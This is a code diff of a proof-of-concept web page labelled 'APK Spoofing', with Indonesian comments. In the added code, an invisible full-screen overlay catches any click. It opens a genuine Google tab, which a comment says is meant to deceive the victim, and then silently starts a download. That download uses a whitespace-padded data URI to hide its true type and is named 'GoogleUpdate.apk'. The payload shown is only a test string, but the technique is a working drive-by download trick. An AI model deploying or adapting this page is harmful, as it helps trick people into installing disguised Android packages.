@@ -1,25 +1,25 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
+  <title>POC Mod 1 - APK Spoofing</title>
 </head>
 <body>
-  <center><h2>POC by Chigorin!</h2></center>
-  <input type="text" id="triggerInput">
+  <center><h2>Klik di mana saja untuk melanjutkan</h2></center>
+  <div id="triggerZone" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:999; cursor:pointer;"></div>
 
   <script>
-    document.getElementById('triggerInput').addEventListener('click', function() {
-      // request fullscreen
- setTimeout(function() {
-        openWin();
- }, 500);
- window.open('https://www.google.com', '_blank');
-    }, { once: false }); // Use { once: true } to ensure it only fires once
+    document.getElementById('triggerZone').addEventListener('click', function() {
+      // Membuka tab baru ke Google asli untuk mengelabui korban
+      window.open('https://www.google.com', '_blank');
+      
+      // Menjalankan download otomatis di latar belakang setelah tab baru terbuka
+      setTimeout(function() {
+        downloadSpoof();
+      }, 300);
+    }, { once: true }); // Dibuat 'once: true' agar tidak terjadi loop download
 
-    // Download helper
-    function Puf(uri, name) {
+    function pufHelper(uri, name) {
       const link = document.createElement("a");
       link.href = uri;
       link.download = name;
@@ -28,18 +28,13 @@
       document.body.removeChild(link);
     }
 
-    // Kick off your “APK” download
-    function openWin() {
-      Puf(
-        "data:https://google.com/                                                                                                                                                                                                                       application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "google.mp4"
+    function downloadSpoof() {
+      // Menggunakan payload spasi panjang untuk menyembunyikan ekstensi asli
+      pufHelper(
+        "data:https://updates.google.com/                                                                                                                                                                                                                                                              application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=",
+        "GoogleUpdate.apk" // Nama file diubah menjadi APK tiruan
       );
     }
-
   </script>
-  
-
-  
 </body>
 </html>
-
